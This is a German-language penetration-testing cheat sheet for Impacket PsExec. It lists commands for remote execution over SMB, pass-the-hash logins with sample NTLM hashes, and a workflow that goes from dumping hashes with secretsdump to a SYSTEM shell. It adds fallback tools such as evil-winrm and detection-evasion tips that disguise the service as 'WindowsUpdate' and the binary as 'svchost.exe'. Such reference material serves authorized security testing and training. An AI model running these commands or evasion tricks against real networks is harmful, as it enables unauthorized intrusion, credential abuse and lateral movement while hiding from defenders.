# Impacket PsExec

## Was ist PsExec?

Remote Command Execution Tool über SMB. Erstellt einen Service auf dem Zielrechner und führt Commands aus.

➡️ Benötigt Admin-Rechte auf dem Zielrechner
➡️ Nutzt Port 445 (SMB)
➡️ Hinterlässt mehr Spuren als andere Impacket-Tools (Service-Creation-Events)

---

## Grundlegende Syntax

```bash
impacket-psexec [[domain/]username[:password]@]<targetIP>
```

---

## Authentifizierung

### Mit Passwort

```bash
impacket-psexec domain/user:password@192.168.1.100
```

### Mit NTLM Hash (Pass-the-Hash)

```bash
impacket-psexec -hashes :NTHASH user@192.168.1.100
```

```bash
impacket-psexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.1.100
```

### Mit LM:NTLM Hash

```bash
impacket-psexec -hashes LMHASH:NTHASH user@192.168.1.100
```

### Lokaler User (ohne Domain)

```bash
impacket-psexec ./administrator:Password123@192.168.1.100
```

➡️ `./` oder `-local-auth` für lokale Accounts

---

## Wichtige Optionen

### Port angeben

```bash
impacket-psexec user:pass@192.168.1.100 -port 445
```

### Kein Passwort-Prompt (wichtig für Scripts)

```bash
impacket-psexec -no-pass -hashes :HASH user@192.168.1.100
```

### Debug-Output

```bash
impacket-psexec user:pass@192.168.1.100 -debug
```

### Service-Name ändern (weniger auffällig)

```bash
impacket-psexec user:pass@192.168.1.100 -service-name CustomSvc
```

### Remote Path für Binary

```bash
impacket-psexec user:pass@192.168.1.100 -remote-binary-name custom.exe
```

---

## Praktische Beispiele

### 1. Direkter Shell-Zugriff

```bash
impacket-psexec administrator:P@ssw0rd@192.168.1.100
```

### 2. Single Command ausführen

```bash
impacket-psexec user:pass@192.168.1.100 "whoami"
```

```bash
impacket-psexec user:pass@192.168.1.100 "ipconfig /all"
```

### 3. Mit Credentials aus Datei

```bash
# credentials.txt: domain/user:password
impacket-psexec @192.168.1.100 < credentials.txt
```

### 4. Lateral Movement nach Hash-Dump

```bash
# Nach Mimikatz/Secretsdump
impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.101
```

### 5. Mit Domain Account

```bash
impacket-psexec CORP/administrator:Password123@DC01.corp.local
```

### 6. Local Admin Account nutzen

```bash
impacket-psexec -local-auth admin:Password@192.168.1.100
```

---

## Häufige Fehler

### STATUS_ACCESS_DENIED

➡️ User hat keine Admin-Rechte oder falsches Passwort
➡️ Prüfe mit CrackMapExec: `crackmapexec smb IP -u user -p pass`

### STATUS_LOGON_FAILURE

➡️ Falsche Credentials oder Account gesperrt
➡️ Bei Domain-Accounts: Domain-Name korrekt?

### Cannot request session

➡️ SMB-Signing Problem oder Firewall blockiert
➡️ Prüfe Port 445: `nmap -p445 IP`

### "File exists" Error

➡️ Service von vorherigem Lauf noch aktiv
➡️ Lösung: Service-Name ändern mit `-service-name`

---

## Vergleich mit anderen Impacket-Tools

| Tool | Technik | Vorteil | Nachteil |
|------|---------|---------|----------|
| **psexec** | Service Creation | Stabil, interactive shell | Sehr laut (Logs) |
| **wmiexec** | WMI | Weniger Logs | Semi-interactive |
| **smbexec** | Service Creation | Keine Binary Upload | Semi-interactive |
| **atexec** | Task Scheduler | Single command | Keine Shell |

➡️ Für Stealth: Nutze **wmiexec**
➡️ Für beste Shell-Erfahrung: Nutze **psexec**

---

## OPSEC Considerations

### PsExec hinterlässt folgende Spuren:

- Event ID 7045 (Service Installation)
- Service-Binary in `C:\Windows\`
- Logs in System Event Log

### Weniger auffällig machen:

```bash
# Service-Name tarnen
impacket-psexec -service-name "WindowsUpdate" user:pass@IP

# Remote Binary-Name ändern
impacket-psexec -remote-binary-name "svchost.exe" user:pass@IP
```

---

## Workflow: Vom Hash zur Shell

```bash
# 1. Hashes dumpen mit secretsdump
impacket-secretsdump user:pass@192.168.1.100

# 2. Admin-Hash identifizieren
# Administrator:500:aad3b...:8846f7e...

# 3. PsExec mit Hash
impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.101

# 4. In der Shell
C:\Windows\system32> whoami
nt authority\system
```

---

## Alternativen wenn PsExec blockiert wird

```bash
# 1. WMI nutzen
impacket-wmiexec user:pass@IP

# 2. SMB nutzen
impacket-smbexec user:pass@IP

# 3. Evil-WinRM (wenn WinRM aktiv)
evil-winrm -i IP -u user -p pass

# 4. RDP (wenn aktiviert)
xfreerdp /u:user /p:pass /v:IP
```
